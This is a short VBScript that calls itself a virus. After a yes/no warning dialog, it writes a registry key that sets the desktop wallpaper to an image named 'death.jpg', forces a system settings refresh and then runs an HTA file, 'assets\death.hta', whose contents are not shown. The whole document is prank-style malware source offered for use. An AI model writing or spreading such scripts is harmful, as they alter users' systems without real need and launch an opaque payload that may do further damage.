Dim userResponse
userResponse = MsgBox("This virus is not a joke. Do you really want to proceed?", vbYesNo + vbCritical, "Warning")

If userResponse = vbNo Then
    WScript.Quit
Else
    Set objShell = CreateObject("WScript.Shell")
    objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "assets\death.jpg"
    objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"
    objShell.Run "assets\death.hta"
End If
